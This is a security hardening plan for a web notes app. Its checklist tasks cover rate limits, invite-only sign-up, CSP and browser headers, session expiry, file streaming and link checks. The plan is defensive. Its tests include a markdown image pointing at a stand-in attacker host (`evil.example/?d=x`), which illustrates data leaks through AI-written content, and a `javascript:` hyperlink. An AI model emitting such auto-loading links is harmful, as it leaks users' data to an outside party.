# Security Hardening Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix the 12 findings from the 2026-11-03 security review: AI cost abuse, sign-in limits, account takeover,
missing browser protections, AI-written image leaks, memory-heavy file transfers, and five lower-risk gaps.

**Architecture:** One shared Postgres-backed counter store serves every rate limit (several API copies run in
production). Sign-up gets a `SIGNUP_MODE` with invite-bound sign-up, plus optional SMTP for email verification and
password reset. nginx sends a strict CSP and other headers from one included snippet. Files stream to and from S3
instead of being buffered.

**Decisions already made (2026-11-03):**

- Invitations: **both**. Sign-up through an invite link always works without SMTP. When SMTP is configured, emails are
  verified and unverified accounts cannot accept invites.
- Sign-up default: **`auto`**, meaning open until the first account exists, then invite-only.
- Session: **keep the bearer token in localStorage**. Contain it with CSP and headers, and shorten its life with sliding
  renewal. No cookie or CSRF work.
- Rate-limit counters: **shared in Postgres**, because production runs several API copies.

**Tech stack:** Fastify + `@fastify/rate-limit` (custom `store`), Drizzle + migrations in `packages/db/migrations`,
nginx (`apps/web/nginx.conf`), Hocuspocus 4, BlockNote 0.49, `@aws-sdk/lib-storage`, Vitest (`vitest.config.ts`,
`vitest.pg.config.ts`), Playwright e2e.

## Global Constraints

- Every new limit and quota is a `ConfigSchema` setting (`packages/shared/src/config.ts`) with a safe default and an
  upper bound, like `AUTH_RATE_LIMIT_MAX`. e2e sets loose values, the same way it already sets `AUTH_RATE_LIMIT_MAX`.
- New errors go in `packages/contracts/src/errors.ts` with a status and a user-facing message.
- Global tables (no `tenant_id`) follow `users`/`sessions`: no RLS, with `GRANT`s to `kinote_app` in the migration.
- Document every new setting in `.env.example`, `docker-compose.yml` and `site/self-host/configuration.md`.
- No behaviour change for existing users beyond what each task states. Each task lists its upgrade note for
  `site/self-host/upgrading.md`.

## Phases

| Phase | Tasks | Why this order |
|---|---|---|
| 1. Quick config and headers | T1 (#2), T2 (#5), T3 (#9), T4 (#10), T5 (#8) | Config and headers only, low risk, and the biggest drop in impact for any future XSS |
| 2. Shared limits and quotas | T6 (store), T7 (#1), T8 (#3 throttle) | T6 is needed by T7, T8 and T12 |
| 3. Accounts | T9 (#1/#4 sign-up modes), T10 (#4 SMTP), T11 (#3 passwords), T12 (#11 sessions and tokens) | Depends on T6; T10 builds on T9 |
| 4. Content and files | T13 (#6), T14 (#7), T15 (#12) | Independent; T13 depends on T2 for its CSP backstop |

(`#n` is the finding number in the review report.)

---

## Phase 1: Quick config and headers

### T1. Give each client its own sign-in bucket (#2)

**Files:** `docker-compose.yml:25-28`, `docs/operations.md` (~line 360), `site/self-host/proxy.md`,
`packages/shared/src/config.ts` (TRUST_PROXY doc comment), `apps/api/src/main.ts`.

- [x] Change compose to `TRUST_PROXY: ${TRUST_PROXY:-1}` and rewrite the comment: the bundled nginx is always one hop,
  so use `1` locally and `2` behind Coolify or another edge proxy.
- [x] Fix the docs line that says `false` is right locally.
- [x] *(Done in `server.ts`: `true` warns at start; `false` warns once on the first request carrying `X-Forwarded-For`.)* Startup warnings in `main.ts`: when `TRUST_PROXY === true` (any client can choose its own bucket), and when it's
  `false` and the first requests all come from one private address. Keep the second warning to one per process.
- [x] Test: an api test with `trustProxy: 1` and two different `X-Forwarded-For` values gets two buckets. A spoofed
  extra left-hand hop does not change the bucket.

**Upgrade note:** operators who set `TRUST_PROXY=false` on purpose keep it, and should set `1`.

### T2. Browser security headers (#5, plus COOP for #10)

**Files:** new `apps/web/security-headers.conf`, `apps/web/nginx.conf`, `apps/web/Dockerfile` (copy the snippet),
`apps/web/index.html` (inline script on line 11), new `apps/web/public/theme.js`, `apps/api/src/server.ts`.

- [x] Move the inline theme script in `index.html` into `public/theme.js` (a blocking `<script src>` in `<head>`), so
  the CSP needs no hash that drifts with every edit.
- [x] Write `security-headers.conf`, every line using `always`:
  - `Content-Security-Policy: default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' blob: data:; media-src 'self' blob:; font-src 'self'; worker-src 'self' blob:; connect-src 'self'; frame-src 'self'; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'`
  - `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`,
    `Cross-Origin-Opener-Policy: same-origin`,
    `Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()`
- [x] HSTS: `map $http_x_forwarded_proto $hsts { https "max-age=31536000"; default ""; }` and then
  `add_header Strict-Transport-Security $hsts always;`. nginx sends nothing for an empty value, so local plain-HTTP use
  is unaffected.
- [x] `include` the snippet at server level **and** inside every `location` that has its own `add_header` (`.mjs`,
  `.wasm`, `/excalidraw-assets/`, `/assets/`, `= /index.html`). nginx drops inherited `add_header` lines in any block
  that sets its own.
- [x] *(Done differently: the local e2e stack serves the built console with the same headers, read from the nginx files, and reports every violation; the whole suite ran clean, so the policy ships enforcing. It caught Excalidraw's esm.sh font fallback, now removed in `excalidrawEnv.ts`.)* Roll out in two steps: send the policy as `Content-Security-Policy-Report-Only` first, run the full e2e suite,
  and collect `securitypolicyviolation` events in a Playwright fixture. Fix each one, either by adjusting the policy
  (e.g. `connect-src` for the collab websocket, Excalidraw fonts, pdf.js and the xlsx WASM worker) or the code. Then
  switch to the enforcing header.
- [x] `frame-src 'self'` turns off Excalidraw's third-party embeds. Make that explicit in
  `apps/web/src/components/drawing/DrawingCanvas.tsx` with `validateEmbeddable={false}`, so the UI doesn't offer
  embeds that would show blank.
- [x] API: an `onSend` hook in `server.ts` sets `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` and
  `Content-Security-Policy: default-src 'none'; frame-ancestors 'none'` on JSON responses. File and media routes keep
  the headers they already set, so skip any reply that already has a CSP.
- [x] Test: an e2e spec asserts the headers on `/`, `/index.html`, an `/assets/*.js` file, `/api/v1/auth/me` and
  `/gridcraft/` (T5), and that the console loads with no CSP violations.

**Known effect:** images on other sites that users pasted into pages stop showing (`img-src 'self'`). This is
deliberate, because it also stops tracking pixels and #6. Mention it in the release notes.

### T3. Live-editing message and connection limits (#9)

**Files:** `apps/collab/src/server.ts:165-173`, `packages/shared/src/config.ts`, `apps/web/nginx.conf`.

- [x] Add a `COLLAB_MAX_MESSAGE_BYTES` setting (default 2 MiB, max 64 MiB). Pass it to Hocuspocus as the ws
  `maxPayload`. Check the option name in `@hocuspocus/server` 4.x: it's either `websocketOptions` on `Server` or the
  `WebSocketServer` options.
- [x] *(Not measured; the default is 8 MiB, matching the collab internal body limit, against 1 MB for a whole drawing.)* Before picking the default, check the largest real update: open a 1,000-block page plus a drawing and measure
  the first sync.
- [x] nginx: add `limit_conn_zone $binary_remote_addr zone=collab_conn:10m;` and `limit_conn collab_conn 20;` on
  `/collab` and `/collab/`. Behind Coolify, use the real-IP module with `set_real_ip_from` the edge proxy.
- [x] *(Done 2026-11-04: collab logs them only when LOG_LEVEL is debug or trace, through `console.debug`; `apps/collab/test/connectionLogs.test.ts`.)* Move the connect and disconnect logs (`server.ts:129-133`) to `debug`.
- [x] Test: a collab test sends a frame one byte over the limit and expects the socket to close with code 1009.

### T4. Stop editor links handing over the Kinote tab (#10)

**Files:** `apps/web/src/components/Editor.tsx:55`, a new test next to it.

- [x] Pass `links: { onClick }` to `useCreateBlockNote`. Check the option name in BlockNote 0.49's
  `BlockNoteEditorOptions`. The handler finds the closest `a`, checks the scheme (http, https or mailto, otherwise do
  nothing), calls `window.open(a.href, '_blank', 'noopener,noreferrer')` and returns `true`.
- [x] *(Done differently: a read-only editor opens plain link clicks through the same safe handler, and COOP `same-origin` cuts the opener for any other click.)* Remove `target` and `rel` from the link mark's rendered attributes so a collaborator can't set `rel="opener"`:
  either extend the Link mark in `wikiSchema` to drop them on render, or force `rel="noopener noreferrer"` there.
- [x] COOP `same-origin` from T2 covers anything this misses.
- [x] Test: a unit test clicks a rendered link and asserts the `window.open` arguments. A second test checks a Yjs doc
  with `rel="opener"` renders without it.

### T5. Keep GridCraft sandboxed when opened directly (#8)

**Files:** `apps/web/nginx.conf` (`location ^~ /gridcraft/`), `apps/web/src/viewers/GridCraftEditor.tsx:249`.

- [x] Add `add_header Content-Security-Policy "sandbox allow-scripts; frame-ancestors 'self'" always;` plus
  `X-Content-Type-Options: nosniff` in the `/gridcraft/` location. Don't include the main snippet there, because its
  `frame-ancestors 'none'` would block the embed.
- [x] Check that the editor still loads its own module assets under an opaque origin. Module scripts need CORS, and
  `apps/gridcraft/nginx.conf` already sends `ACAO: *`.
- [x] *(Done 2026-11-04: GridCraft 0.13's JS binds only `clipboard.write`/`writeText` and takes paste from the paste event, so `clipboard-read` went. The e2e fake shows paste still arrives and the frame can no longer read the clipboard by itself; with `clipboard-read` back, it reads it.)* Remove `allow="clipboard-read"` from the iframe unless GridCraft paste breaks without it. Test paste.
- [x] Test: the T2 e2e header spec covers `/gridcraft/`. An existing GridCraft e2e must still pass.

---

## Phase 2: Shared limits and quotas

### T6. Postgres-backed counter store

**Files:** new migration `packages/db/migrations/0038_rate_limits.sql`, `packages/db/src/schema/foundations.ts`, new
`apps/api/src/rateLimitStore.ts`, `apps/api/src/server.ts:358`, `apps/worker/src` (cleanup).

- [x] Table `rate_limit_counters (key text primary key, count int not null, reset_at timestamptz not null)`. It's
  global with no RLS, so `GRANT SELECT, INSERT, UPDATE, DELETE` to `kinote_app`.
- [x] One atomic statement per hit:
  `INSERT ... VALUES ($key, 1, now() + $window) ON CONFLICT (key) DO UPDATE SET count = CASE WHEN rate_limit_counters.reset_at <= now() THEN 1 ELSE rate_limit_counters.count + 1 END, reset_at = CASE WHEN rate_limit_counters.reset_at <= now() THEN now() + $window ELSE rate_limit_counters.reset_at END RETURNING count, reset_at`.
- [x] *(Store in `apps/api/src/rateLimitStore.ts`; counters in `packages/db/src/rateLimits.ts`, using the database clock.)* `PgRateLimitStore` implements `@fastify/rate-limit`'s store interface (`incr(key, cb)`, `child(routeOptions)`),
  and register it as `store` in `server.ts`.
- [x] *(As `hitLimit`, `hitCounter`, `readCounter`, `clearCounter`.)* Also export `hit(key, max, windowMs): Promise<{ allowed: boolean; retryAfterMs: number }>` for limits that
  aren't per-route (T7 budgets, T8 per-account, T12).
- [x] *(A sweep in `runWorkerLoop`, not a job.)* Worker job deletes rows whose `reset_at < now() - interval '1 hour'` every 10 minutes.
- [x] If the database fails, refuse sign-in and sign-up and allow everything else (log at error). Tested.
- [x] *(On PGlite; not yet run against the real Postgres suite, `pnpm test:pg`.)* Tests (pg): two Fastify instances on one database share a bucket; the window resets; concurrent hits are
  counted exactly.

### T7. Limit AI-backed and costly routes, and add budgets (#1)

**Files:** `apps/api/src/server.ts` (`/search` ~1052, `/ask` ~1080, `/captures` ~941, `/demo-seed*` ~443-457,
`POST /tenants` ~325), `packages/shared/src/config.ts`, worker job runner (budget check),
`packages/core/src/placement/derived.ts:21`.

- [x] *(Not through the plugin, which only sees routes declared after it loads: an explicit `onRequest` hook, `requestLimit` in `apps/api/src/usageLimits.ts`. These fail open.)* Per-route limits keyed `tenantId:userId`, or `source:<tokenId>` for source tokens:

  | Route | Setting | Default |
  |---|---|---|
  | `/ask` | `ASK_RATE_LIMIT_PER_MIN` | 10 |
  | `/search` | `SEARCH_RATE_LIMIT_PER_MIN` | 60 |
  | `/captures` | `CAPTURE_RATE_LIMIT_PER_MIN` | 20 |
  | `/demo-seed`, `/demo-seed/reset` | fixed | 3 per hour per tenant |
  | `POST /tenants` | `MAX_TENANTS_PER_USER` | 5 total, plus 5 per hour |
  | file upload | `UPLOAD_RATE_LIMIT_PER_MIN` | 30 |

- [x] *(Done as `TENANT_DAILY_AI_ACTIONS`, counted per AI action, not per provider call: each Ask in the API, and each run of a worker handler marked `usesAi` (capture.route, capture.place, version.card, version.entities). Embeddings for search and indexing aren't counted, so indexing never stops. New captures are refused up front once the allowance is gone.)* Daily AI budget per tenant: `TENANT_DAILY_AI_CALLS` (default 2,000, `0` means unlimited). Count every
  embedding, Ask and router call with `hit('ai:<tenant>:<yyyy-mm-dd>', ...)` at the point the provider is called. That
  catches API and worker calls alike, including `version.card` and `version.entities` jobs.
- [x] When a background job is over budget, it is postponed to the next UTC day, not failed. The UI shows "AI budget
  for today used up" on Ask and capture.
- [x] New error `ai_budget_exhausted` (429).
- [ ] *(Not done: the allowance is config only. Tests and e2e set it to 0.)* Skip the budget when the provider is `deterministic` (no cost), to keep tests and local use simple.
- [x] Tests: the 11th Ask in a minute returns 429 `rate_limited`. A budget of 2 makes the 3rd call return
  `ai_budget_exhausted`, and a queued job moves to tomorrow. Demo reset is limited.

### T8. Per-account sign-in throttle (#3)

**Files:** `apps/api/src/routes/auth.ts:67-81`, `packages/shared/src/config.ts`.

- [x] After the per-IP limit, check `hit('signin-fail:<sha256(lowercased email)>', 5, 15 min)`, but only count
  **failed** attempts. On success, delete that key.
- [x] *(The lock starts at 1 minute and doubles to a 15-minute cap, not 1 hour, so someone who knows an email can only slow its owner down for a short while.)* Past the limit, return `rate_limited` with `Retry-After`, and the backoff doubles each window up to 1 hour
  (`signin-lock:<hash>` holds the level). There is no permanent lockout, so the throttle can't be used to lock a victim
  out forever.
- [x] Use the same response and the same timing whether or not the account exists (keep the dummy argon2 path), so it
  doesn't reveal which emails have accounts.
- [x] Tests: 5 wrong passwords from 5 different IPs trigger the throttle, and the right password is refused until the
  window ends. An unknown email throttles the same way.

---

## Phase 3: Accounts

### T9. Sign-up modes and invite-bound sign-up (#1, #4)

**Files:** `packages/shared/src/config.ts`, `apps/api/src/routes/auth.ts:52-63`,
`apps/api/src/routes/foundations.ts:637-680` (`acceptInvitation`), `packages/contracts/src/index.ts` (sign-up
schema), web sign-up and accept-invite pages in `apps/web/src`.

- [x] `SIGNUP_MODE: auto | open | invite | closed` (default `auto`):
  - `auto`: sign-up is open while `users` has no row other than demo users, then behaves as `invite`.
  - `invite`: sign-up needs `invitation_token`.
  - `closed`: no sign-up. Accounts only come from the operator CLI (T11).
- [x] `POST /auth/sign-up` takes an optional `invitation_token`. With it, in one transaction:
  - check the invitation is pending and unexpired
  - create the user **with the invitation's email**, ignoring any email the client sent
  - set `email_verified_at = now()` (having the link counts as proof) and accept the invitation
  - return the session
- [x] *(The sign-up page reads the token from the accept-invite redirect, shows the invited email read-only, and lands in the workspace; co-edit e2e covers it.)* The web accept-invite page offers "Create account" (name and password only, email shown read-only) or
  "Sign in". The sign-up page reads the mode from a public `GET /api/v1/auth/config` and hides itself when it's not
  open.
- [x] Startup warning when the mode is `open` and SMTP is not configured: anyone can register any email.
- [x] *(As planned. Without SMTP, open mode still answers 409 for a taken email.)* Enumeration: in invite mode the email comes from the invite, so nothing leaks. In open mode with SMTP (T10),
  return 202 "check your email" for both new and existing addresses. In open mode without SMTP, keep 409 and document
  that trade-off.
- [x] Tests:
  - `auto` allows the first sign-up and refuses the second without a token
  - an invite token signs up with the invite's email even if another email is posted
  - an expired or used token is refused
  - `closed` refuses everything

**Upgrade note:** existing instances already have users, so `auto` becomes invite-only on upgrade. To keep today's
behaviour, set `SIGNUP_MODE=open`. Put this at the top of the release notes.

### T10. Optional SMTP: verification, password reset, invite emails (#4)

**Files:** new `apps/api/src/mail.ts`, `packages/shared/src/config.ts`, new migration `0039_email_verification.sql`,
`packages/db/src/schema/foundations.ts`, `apps/api/src/routes/auth.ts`, `apps/api/src/routes/foundations.ts`, web pages
for verify and reset.

- [x] Settings: `SMTP_URL` (e.g. `smtps://user:pass@host:465`) and `MAIL_FROM`. When `SMTP_URL` is unset, everything
  below is off.
- [x] *(nodemailer 10.3.1. PUBLIC_URL is required too, for the links.)* Use `nodemailer` (pin the exact version).
- [x] Migration:
  - `users.email_verified_at timestamptz null`; backfill `now()` for existing users so nobody is locked out.
  - new table `email_tokens (token_hash text pk, user_id uuid, purpose text check (purpose in ('verify','reset')), expires_at, used_at)`
  - it's global with no RLS; add the grants
- [x] Tokens are 32 random bytes and stored as SHA-256. Verify tokens last 24 hours, reset tokens 1 hour, and each
  works once.
- [x] With SMTP on:
  - sign-up (open mode) sends a verify link, and the account can sign in but can't accept invitations until verified
  - `acceptInvitation` adds an `email_verified_at IS NOT NULL` check, so an account signed up with someone else's
    email can't take their invitation
  - new endpoints: `POST /auth/verify`, `POST /auth/password-reset/request` (always 202) and
    `POST /auth/password-reset/confirm` (sets the password, revokes all sessions)
  - [x] *(Done 2026-11-04: `send_email` on `POST /invitations`, `emailed` in the answer, 20 emails per workspace an hour; the link is still shown to the admin. The form's "Email the link to them" is ticked by default, and "New link" emails too.)* creating an invitation can also email the link, if the admin ticks "Send email"
- [x] Rate-limit the reset request and verify resend through T6, per email and per IP.
- [x] Tests (with a fake transport): the verify flow; an unverified account can't accept an invite; a reset revokes
  sessions; a reset request for an unknown email gets the same 202 and sends nothing.

### T11. Password change and operator reset (#3)

**Files:** `apps/api/src/routes/auth.ts`, `apps/api/src/auth/sessions.ts`, new `scripts/reset-password.ts` (or a
`pnpm kinote` command), web account settings page.

- [x] `POST /auth/password` with `{ current_password, new_password }`. It checks the current password, sets the new
  one, revokes every other session of that user and clears the session cache.
- [x] *(`apps/api/src/cli/resetPassword.ts`, `pnpm reset-password <email>`.)* Operator reset is a **CLI, not an admin route**. A tenant admin must not be able to reset a user who also
  belongs to other tenants. The CLI `pnpm --filter @kinote/api reset-password <email>` prints a one-time reset link
  (a T10 `reset` token, which works without SMTP) and revokes the user's sessions.
- [ ] *(Not done: no common-password list is bundled yet. The minimum of 10 stays.)* Password policy: keep the minimum of 10. Reject the 10,000 most common passwords from a bundled list (no network
  call).
- [x] Tests: a password change keeps the current session and kills the others; the CLI link works once; a common
  password is refused.

### T12. Sessions, source tokens and media links (#11)

**Files:** `apps/api/src/auth/sessions.ts`, `apps/api/src/routes/auth.ts`, `apps/api/src/routes/sources.ts:203`,
`packages/shared/src/mediaToken.ts`, `apps/api/src/routes/files.ts` (media route), `apps/api/src/logger.ts`,
`apps/web/nginx.conf`, admin member-removal UI.

- [x] Sessions:
  - TTL becomes 14 days, sliding: `resolveSession` extends `expires_at` to now + 14 days when under 7 days are left,
    so there is at most one write per session per week
  - add an absolute cap of 90 days from `created_at`
  - add `POST /auth/sign-out-all`, which revokes every session of the user
  - *(a new /account page: change password, sign out everywhere)* add a "Sign out everywhere" button in account settings
- [x] Source tokens:
  - when `expires_in_days` is omitted, default to 90 days; the allowed range is 1–365
  - existing tokens with no expiry are left alone, and the admin page shows a "never expires" warning on them
  - *(not done: an offboarding view of a removed member's tokens)* when a member is removed, the admin sees the source tokens that member created and can revoke them in one click
- [x] Media links:
  - *(done, and stronger: each request re-runs the full read check, so losing a space grant also stops the link)* add the user id to the claims; when a link is used, check the user still belongs to the tenant (one indexed query,
    cached for 5 seconds like the actor cache)
  - the TTL stays at 15 minutes
- [x] Logging: redact the token from `/api/v1/media/*` URLs in the pino request serializer (`logger.ts`), and in nginx
  with a `map $request_uri $loggable_uri` and a custom `log_format`.
- [x] Tests:
  - renewal happens only past the halfway point
  - the 90-day cap holds
  - sign-out-all kills the other sessions
  - a removed member's media link returns 404 at once
  - the source-token default expiry is 90 days
  - the log line has no token

---

## Phase 4: Content and files

### T13. Strip auto-loading media from AI-written blocks (#6)

**Files:** `packages/core/src/routing/liveBlocks.ts:50-52`, `apps/api/src/routes/suggestions.ts:119`,
`apps/collab/src/blockOps.ts` (agent and API writes), new tests next to `liveBlocks`.

- [x] *(`stripRemoteMedia` in `packages/shared/src/blocks.ts`, used by `markdownBlocks` and by page creation from Markdown in the API.)* Add a `stripRemoteMedia(blocks)` step inside `markdownBlocks`, so every engine, suggestion and agent path gets
  it. It walks the blocks and their children, removes `image`, `video`, `audio` and `file` blocks whose `url` is not a
  Kinote file reference (`/api/v1/...` or a fileEmbed id), and replaces each one with a paragraph link to the URL.
  That keeps the information visible, but it doesn't load by itself.
- [x] Check every other path that parses markdown on the server (`tryParseMarkdownToBlocks` or `blocksToYDoc` with
  outside text) and send it through the same function. Grep `tryParseMarkdownToBlocks` across `packages/` and `apps/`.
- [x] Belt and braces: T2's `img-src 'self' blob: data:` blocks the request even if a block gets through.
- [x] Tests:
  - `![](https://evil.example/?d=x)` becomes a link paragraph
  - a Kinote file image is kept
  - nested children are walked
  - a suggestion with an image is stripped end to end

### T14. Stream file transfers, plus storage quotas (#7)

> **Changed (2026-11-03):** downloads and media are streamed; **uploads stay buffered** behind a per-process cap
> (`MAX_CONCURRENT_UPLOADS`, default 4), because duplicate detection hashes and Office detection reads the whole file
> before storing: streaming uploads is a redesign of that flow, not this task. The **storage quota is dropped here**:
> per-workspace storage limits belong to Task 7 of `2026-11-03-plans-usage-quotas.md` (agreed with that plan's
> session). Until it lands there is no storage cap.

**Files:** `packages/shared/src/objectStorage.ts` (interface at line 11, S3 implementation from about line 119),
`apps/api/src/routes/files.ts` (388, 774, 862), `apps/api/src/server.ts:744`, `packages/shared/src/config.ts`, any
in-memory or test storage implementations.

- [x] Add `getStream(tenantId, key): Promise<{ stream: Readable; mimeType: string; sizeBytes: number }>` to
  `ObjectStorage`. For S3, return `res.Body` as a Node `Readable`.
- [x] Downloads (`files.ts:774`, `server.ts:744`) send the stream with `Content-Length`. Keep every header that's set
  today.
- [x] *(Only for files over 4 MiB; smaller ones still answer 200 whole.)* Media without a `Range` header (`files.ts:862`): treat it as `bytes=0-` capped at the existing 4 MiB and send 206
  with `Content-Range`. Browsers' media players handle this.
- [ ] *(Not done; see the note above.)* Uploads (`files.ts:388`):
  - replace `part.toBuffer()` with `part.file` streamed into `@aws-sdk/lib-storage` `Upload`
  - read the first 4 KiB for `detectFileType` through a peek stream
  - if the code hashes the bytes or passes them to extraction, hash on the fly and have extraction read from storage
    (check what it does with the buffer today)
  - if multipart's `truncated` flag is set, abort the upload and delete the partial object
- [ ] *(Dropped: Task 7 of the plans/usage plan.)* Quota: `MAX_TENANT_STORAGE_BYTES` (default 10 GiB, `0` means unlimited). Before an upload, compare the sum of
  `size_bytes` over the tenant's current file versions plus the declared size. Afterwards, re-check with the real size
  and delete if over. New error `storage_quota_exceeded` (413).
- [x] The per-user upload rate limit comes from T7.
- [x] *(getStream on both stores, MinIO included; download headers; media without Range; the upload cap. No heap measurement.)* Tests (pg + MinIO or the storage fake):
  - a 200 MB upload doesn't raise the heap by more than ~32 MB (measure `process.memoryUsage`)
  - a download streams
  - media without Range returns 206 with 4 MiB
  - over quota returns 413, and the object is removed

### T15. Check hyperlinks in the spreadsheet preview (#12)

**Files:** `apps/web/src/viewers/XlsxViewer.tsx`, possibly `patches/@extend-ai__react-xlsx@<version>.patch`.

- [x] See whether `@extend-ai/react-xlsx` has a hyperlink click callback or prop. If so, allow only http, https and
  mailto, and open with `noopener,noreferrer`.
- [x] *(No hook exists: patched with `pnpm patch` (ESM build only; the browser uses it). Not yet reported upstream. `apps/web/test/xlsxHyperlinks.test.ts` fails if an upgrade drops the patch.)* If it doesn't, apply `pnpm patch` to the call at `dist/index.js:19976-19980` with a scheme check, and file an
  upstream issue. Link the issue in a comment next to the patch entry in `package.json`.
- [x] *(Done 2026-11-04: `e2e/files.spec.ts`, javascript:, data:, https: and mailto: links; it fails with the patch undone. Upstream report drafted, not filed yet.)* Test: render a workbook with a `javascript:` and an `https:` hyperlink. Clicking the first does nothing; the
  second opens with `noopener`.

---

## Review Focus

1. **The CSP doesn't break the app.** pdf.js, the xlsx WASM, Excalidraw fonts, the collab websocket and GridCraft must
   all work with the policy enforced, so run the whole e2e suite under Report-Only first.
2. **Upgrading existing instances (T9).** `auto` becomes invite-only on upgrade. Release notes and `upgrading.md` must
   say so up front.
3. **Rate-limit store failure.** If Postgres is down, sign-in fails closed and the AI routes fail open. Check that's
   what's wanted.
4. **No cross-tenant admin powers.** Password reset is CLI-only (T11). Make sure no route lets a tenant admin act on
   a user's account itself.
5. **Streaming error paths (T14).** An S3 error in the middle of a stream must end the response cleanly, not hang.

## Out of scope

- Moving the session token to an HttpOnly cookie (decided against on 2026-11-03; revisit if an XSS is ever found).
- A list of active sessions with per-device revoke (sign-out-all covers the urgent case).
- Breached-password checks against an online service.
